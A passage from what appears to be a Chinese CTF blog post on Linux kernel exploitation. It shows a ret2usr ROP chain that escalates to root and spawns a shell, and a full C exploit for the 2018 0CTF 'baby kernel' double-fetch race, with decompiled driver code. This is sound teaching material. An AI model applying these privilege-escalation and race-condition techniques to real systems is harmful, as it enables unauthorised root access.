+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">unsigned long rop[20] = &#123;</span><br><span class="line">    0x9090909090909090,</span><br><span class="line">    0x9090909090909090,</span><br><span class="line">    0x9090909090909090,</span><br><span class="line">    0x9090909090909090,</span><br><span class="line">    0x9090909090909090,</span><br><span class="line">    0x9090909090909090,</span><br><span class="line">    0x9090909090909090,</span><br><span class="line">    0x9090909090909090,</span><br><span class="line">    canary_,</span><br><span class="line">    0x9090909090909090,</span><br><span class="line">    getroot,                        // 只改变了这里，别的都没变</span><br><span class="line">    0xffffffff81a012da+offset_addr, // swapgs; popfq; ret</span><br><span class="line">    0,</span><br><span class="line">    0xffffffff81050ac2+offset_addr, // iretq; ret;</span><br><span class="line">    getshell,</span><br><span class="line">    user_cs,</span><br><span class="line">    user_flag,</span><br><span class="line">    user_rsp,</span><br><span class="line">    user_ss</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>两者是不是一样？只不过调用getroot函数时调用的是用户态的函数。所以两者基本没什么区别。</p>
+<ul>
+<li>但是为什么可以调用用户态函数呢？</li>
+</ul>
+<p>因为内核有<strong>用户空间的进程不能访问内核空间，但内核空间能访问用户空间</strong> 这个特性，可以以 <code>ring 0</code> 特权执行用户空间代码完成提权等操作。</p>
+<p>不过具体为什么会有<code>*pkc</code>和<code>*cc</code>指针就要具体去查看源代码才能知道了。</p>
+<h2 id="Double-Fetch："><a href="#Double-Fetch：" class="headerlink" title="Double Fetch："></a>Double Fetch：</h2><p>double fetch属于用户态pwn中的条件竞争，属于内核态与用户态之间的数据访问竞争。</p>
+<p>直接来看题<code>2018 0CTF Finals baby kernel</code>：</p>
+<p>照样常规解包查init、start.sh等操作，这里要注意的就是需关闭 <code>dmesg_restrict</code>，不然无法查看printk所打印出的信息：</p>
+<blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; echo 0 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>直接看函数：</p>
+<h3 id="chk-range-not-ok："><a href="#chk-range-not-ok：" class="headerlink" title="_chk_range_not_ok："></a>_chk_range_not_ok：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">bool __fastcall _chk_range_not_ok(__int64 a1, __int64 a2, unsigned __int64 a3)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned __int8 v3; // cf</span><br><span class="line">  unsigned __int64 v4; // rdi</span><br><span class="line">  bool result; // al</span><br><span class="line"></span><br><span class="line">  v3 = __CFADD__(a2, a1);</span><br><span class="line">  v4 = a2 + a1;</span><br><span class="line">  if ( v3 )</span><br><span class="line">    result = 1;</span><br><span class="line">  else</span><br><span class="line">    result = a3 &lt; v4;                           // a3 &gt;= a1 + a2</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>判断大小的一个函数。</p>
+<h3 id="baby-ioctl："><a href="#baby-ioctl：" class="headerlink" title="baby_ioctl："></a>baby_ioctl：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">signed __int64 __fastcall baby_ioctl(__int64 a1, __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; // rdx</span><br><span class="line">  signed __int64 result; // rax</span><br><span class="line">  int i; // [rsp-5Ch] [rbp-5Ch]</span><br><span class="line">  __int64 v5; // [rsp-58h] [rbp-58h]</span><br><span class="line"></span><br><span class="line">  _fentry__(a1, a2);</span><br><span class="line">  v5 = v2;</span><br><span class="line">  if ( (_DWORD)a2 == 26214 )</span><br><span class="line">  &#123;</span><br><span class="line">    printk(&quot;Your flag is at %px! But I don&apos;t think you know it&apos;s content\n&quot;, flag);</span><br><span class="line">    result = 0LL;</span><br><span class="line">  &#125;</span><br><span class="line">  else if ( (_DWORD)a2 == 4919</span><br><span class="line">         &amp;&amp; !_chk_range_not_ok(v2, 16LL, *(_QWORD *)(__readgsqword((unsigned __int64)&amp;current_task) + 4952))                 // a3 = 0x7ffffffff000</span><br><span class="line">                                                // a1 + a2 &lt;= a3</span><br><span class="line">         &amp;&amp; !_chk_range_not_ok(</span><br><span class="line">               *(_QWORD *)v5,</span><br><span class="line">               *(signed int *)(v5 + 8),</span><br><span class="line">               *(_QWORD *)(__readgsqword((unsigned __int64)&amp;current_task) + 4952))</span><br><span class="line">         &amp;&amp; *(_DWORD *)(v5 + 8) == strlen(flag) )</span><br><span class="line">  &#123;</span><br><span class="line">    for ( i = 0; i &lt; strlen(flag); ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( *(_BYTE *)(*(_QWORD *)v5 + i) != flag[i] )</span><br><span class="line">        return 22LL;</span><br><span class="line">    &#125;</span><br><span class="line">    printk(&quot;Looks like the flag is not a secret anymore. So here is it %s\n&quot;, flag);</span><br><span class="line">    result = 0LL;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    result = 14LL;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里主要流程就是根据输入对比，然后和内存flag做比较。主要看的是这个：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">   !_chk_range_not_ok(v2, 16LL, *(_QWORD *)(__readgsqword((unsigned __int64)&amp;current_task) + 4952))                 // a3 = 0x7ffffffff000</span><br><span class="line">                                       // a1 + a2 &lt;= a3</span><br><span class="line">&amp;&amp; !_chk_range_not_ok(</span><br><span class="line">      *(_QWORD *)v5,</span><br><span class="line">      *(signed int *)(v5 + 8),</span><br><span class="line">      *(_QWORD *)(__readgsqword((unsigned __int64)&amp;current_task) + 4952))</span><br><span class="line">&amp;&amp; *(_DWORD *)(v5 + 8) == strlen(flag)</span><br></pre></td></tr></table></figure>
+<p>这里的v2是<code>ioctl</code>的第三个参数，也就是<code>v2 + 16 &lt;= a3</code>这个条件，第二个条件是<code>*v5 + *(v5+8) &lt;= a3</code>，第三个条件是<code>*(v5 + 8) == strlen(flag)</code>。</p>
+<p>从第三个条件很容易就看出来传入参数其中一个是flag的长度值，在看看<code>__readgsqword((unsigned __int64)&amp;current_task) + 4952</code>的值是多少，在gdb中调试会明显很多：</p>
+<p><img src="/kernel_pwn2/E43FD602-07D0-4AE1-B9C9-9773FCCC9501.png" alt="E43FD602-07D0-4AE1-B9C9-9773FCCC9501"></p>
+<p>可以看到是<code>0x7ffffffff000</code>，那么可以很容易想到是为了检测是否在用户态而设定的。</p>
+<p>所以可以得到上面的第一第二条件是在判断v5是否在用户态，且v5中的flag段是否在用户态。那么就可以构造出一个结构体了：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">struct Flag &#123;</span><br><span class="line">  char *flag_str;</span><br><span class="line">  unsigned long flag_len;</span><br><span class="line">&#125;*flag;</span><br></pre></td></tr></table></figure>
+<p>这里需要注意的一个点就是因为flag是一个只想结构体的指针，所以需要给它初始化指针，否则会出现<code>segment</code>报错。</p>
+<blockquote>
+<p>struct Flag <em>flag = (struct Flag </em>)malloc(sizeof(struct Flag));</p>
+</blockquote>
+<p>结构体找到了，那么就是利用条件竞争的时候了，因为程序是过了上面三个条件判断后就可以开始逐字节对比flag了，所以说我们可以在程序经过上三层判断的时候，开线程修改掉flag的地址为程序中的flag地址，这样就能对比成功了，最终打印flag。</p>
+<p>那么如何知道程序中的flag地址呢，很明显的在ioctl函数中，当参数为<code>26214</code>时，就能够打印出flag地址。</p>
+<h3 id="EXP：-1"><a href="#EXP：-1" class="headerlink" title="EXP："></a>EXP：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;pthread.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;sys/ioctl.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">char s[] = &quot;flag&#123;1111_1111_11_1111_1111_1111&#125;&quot;;</span><br><span class="line">char *flag_addr = NULL;</span><br><span class="line">int finish = 0;</span><br><span class="line"></span><br><span class="line">struct Flag&#123;</span><br><span class="line">    char *flag_str;</span><br><span class="line">    unsigned long flag_len;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void *thread_run(void *tt)&#123;</span><br><span class="line">    struct Flag *flag = tt;</span><br><span class="line"></span><br><span class="line">    while(!finish)&#123;</span><br><span class="line">        flag-&gt;flag_str = flag_addr;    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line"></span><br><span class="line">    setvbuf(stdin,0,2,0);</span><br><span class="line">    setvbuf(stdout,0,2,0);</span><br><span class="line">    setvbuf(stderr,0,2,0);</span><br><span class="line"></span><br><span class="line">    int fd = open(&quot;/dev/baby&quot;,0);</span><br><span class="line"></span><br><span class="line">    struct Flag *flag = (struct Flag *)malloc(sizeof(struct Flag));</span><br><span class="line"></span><br><span class="line">    flag-&gt;flag_str = s;</span><br><span class="line">    flag-&gt;flag_len = 0x21;</span><br><span class="line"></span><br><span class="line">    ioctl(fd,0x6666);</span><br><span class="line"></span><br><span class="line">    system(&quot;dmesg | grep \&quot;Your flag is at \&quot;&quot;);</span><br><span class="line">    printf(&quot;input the flag addr :&quot;);</span><br><span class="line">    scanf(&quot;%x&quot;,&amp;flag_addr);</span><br><span class="line">    </span><br><span class="line">    pthread_t t1;</span><br><span class="line">    pthread_create(&amp;t1,NULL,thread_run,flag);</span><br><span class="line">    </span><br><span class="line">    for(int i=0;i&lt;0x1000;i++)&#123;</span><br><span class="line">        int ret = ioctl(fd,4919,flag);</span><br><span class="line">        if(ret != 0)&#123;</span><br><span class="line">            printf(&quot;the flag addr:%p&quot;,flag-&gt;flag_str);</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            goto end;</span><br><span class="line">        &#125;</span><br><span class="line">        flag-&gt;flag_str = s;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">end :</span><br><span class="line">    finish = 1;</span><br><span class="line"></span><br><span class="line">    pthread_join(t1,NULL);</span><br><span class="line">    //ioctl(fd,4919,&amp;flag);</span><br><span class="line">    system(&quot;dmesg | grep \&quot;the flag is not a secret anymore.\&quot;&quot;);</span><br><span class="line">    close(fd);    </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这题还有一种解法，是侧信道攻击解法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">因为是逐字节判断，所以可以将一个字符写在page的最末端，当判断下一个字符的时候，会访问一个不存在的地址，导致crash，从而一位一位得到flag。</span><br></pre></td></tr></table></figure>
+<p>这里就不讨论了。</p>
+<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>以上就是linux kernel pwn中的基本类型了，其实本质上和用户态的pwn相差无几，不过是exp的编写语言改变了，或者说是目的改变（提权or拿shell），了解透彻了还是很明确的。</p>
+<h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><ul>
+<li><a href="https://veritas501.space/2018/06/04/0CTF%20final%20baby%20kernel/" target="_blank" rel="noopener">https://veritas501.space/2018/06/04/0CTF%20final%20baby%20kernel/</a></li>
+<li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/double-fetch/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/double-fetch/</a></li>
+<li><a href="http://zhangxiaoya.github.io/2015/05/15/multi-thread-of-c-program-language-on-linux/" target="_blank" rel="noopener">http://zhangxiaoya.github.io/2015/05/15/multi-thread-of-c-program-language-on-linux/</a></li>
+</ul>
+
+    
+  </div>
+
+  
+      <div class="git"></div>
+  
+
+</article>
+
+
+   
+  <div class="text-center donation">
+    <div class="inner-donation">
+      <span class="btn-donation">支持一下</span>
+      <div class="donation-body">
+        <div class="tip text-center">扫一扫，支持v1nke</div>
+        <ul>
+        
+          <li class="item">
+            <span>微信扫一扫</span>
+            <img src="/images/qr-wechat.jpeg" alt="">
+          </li>
+        
+          <li class="item">
+            <span>支付宝扫一扫</span>
+            <img src="/images/qr-wechat.jpeg" alt="">
+          </li>
+        
+        </ul>
+      </div>
+    </div>
+  </div>
+
+
+   
+  <div class="box-prev-next clearfix">
+    <a class="show pull-left" href="/2019/03/23/kernel_pwn1/">
+        <i class="icon icon-angle-left"></i>
+    </a>
+    <a class="show pull-right" href="/2019/03/26/Kernel_Pwn_Kownledge/">
+        <i class="icon icon-angle-right"></i>
+    </a>
+  </div>
+
+
+
+
+</div>
+
+
+  <a id="backTop" class="back-top">
+    <i class="icon-angle-up"></i>
+  </a>
+
+
+
+
+  <div class="modal" id="modal">
+  <span id="cover" class="cover hide"></span>
+  <div id="modal-dialog" class="modal-dialog hide-dialog">
+    <div class="modal-header">
+      <span id="close" class="btn-close">关闭</span>
+    </div>
+    <hr>
+    <div class="modal-body">
+      <ul class="list-toolbox">
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/archives/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              博客
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/tag/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              标签
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/link/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              友链
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/about/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              关于
+            </a>
+          </li>
+        
+      </ul>
+
+    </div>
+  </div>
+</div>
+
+
+
+  
+      <div class="fexo-comments comments-post">
+    
+
+    
+
+    
+    
+
+    
+
+    
+    
+
+  </div>
+
+  
+
+  <script type="text/javascript">
+  function loadScript(url, callback) {
+    var script = document.createElement('script')
+    script.type = 'text/javascript';
+
+    if (script.readyState) { //IE
+      script.onreadystatechange = function() {
+        if (script.readyState == 'loaded' ||
+          script.readyState == 'complete') {
+          script.onreadystatechange = null;
+          callback();
+        }
+      };
+    } else { //Others
+      script.onload = function() {
+        callback();
+      };
+    }
+
+    script.src = url;
+    document.getElementsByTagName('head')[0].appendChild(script);
+  }
+
+  window.onload = function() {
+    loadScript('/js/bundle.js?235683', function() {
+      // load success
+    });
+  }
+</script>
+
+</body>
+</html>
